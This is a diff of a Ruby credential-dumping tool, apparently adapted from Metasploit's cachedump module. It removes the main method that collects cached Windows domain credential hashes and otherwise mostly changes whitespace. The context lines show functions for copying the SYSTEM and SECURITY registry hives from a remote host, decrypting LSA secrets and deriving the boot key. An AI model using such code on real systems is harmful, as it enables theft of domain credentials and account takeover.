@@ -2,33 +2,6 @@
 require 'digest'
 require 'openssl'
 
-# This is the main control method
-def run(secpath, syspath)
-	credentials = Table.new(
-		'Header'    => "MSCACHE Credentials",
-		'Indent'    => 1,
-		'Columns'   =>
-		[
-			"Username",
-			"Hash",
-			"Logon Domain Name",
-			"DNS Domain Name",
-			"Last Login",
-			"UPN",
-			"Effective Name",
-			"Full Name",
-			"Logon Script",
-			"Profile Path",
-			"Home Directory",
-			"HomeDir Drive",
-			"Primary Group",
-			"Additional Groups"
-		])
-	dump_cache_creds(secpath, syspath, credentials)
-end
-
-
-
 # This method attempts to use reg.exe to generate copies of the SYSTEM, and SECURITY registry hives
 # and store them in the Windows Temp directory on the remote host
 def save_reg_hives(secpath, syspath)
@@ -207,8 +180,6 @@ def decrypt_hash_vista(edata, nlkm, ch)
 	end
 	return jj	
 end
-
-
 
 # Code sampled from post/windows/gather/cachedump.rb
 def parse_decrypted_cache(dec_data, s, credentials)
@@ -422,8 +393,6 @@ def convert_des_56_to_64(kstr)
 	return key.pack("C*")
 end
 
-
-
 # Code sampled from post/windows/gather/cachedump.rb
 # Ruby implementation of SystemFunction005
 # the original python code has been taken from Credump
@@ -449,8 +418,6 @@ def decrypt_secret(secret, key)
 	dec_data_len = decrypted_data[0].ord
 	return decrypted_data[8..8+dec_data_len]
 end
-
-
 
 # Code sampled from post/windows/gather/cachedump.rb
 def decrypt_lsa(pol, encryptedkey)
@@ -533,7 +500,7 @@ def get_boot_key(hive)
 			#bootkey << [tmp].pack("H*")
 			bootkey << [tmp.to_i(16)].pack("V")
 		end
-		keybytes = bootkey.unpack("C*")
+    keybytes = bootkey.unpack("C*")
 
 
 		#p = [ 11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4 ]
@@ -549,7 +516,7 @@ def get_boot_key(hive)
 end
 
 class Table
-	#
+  #
 	# Initializes a text table instance using the supplied properties.  The
 	# Table class supports the following hash attributes:
 	#
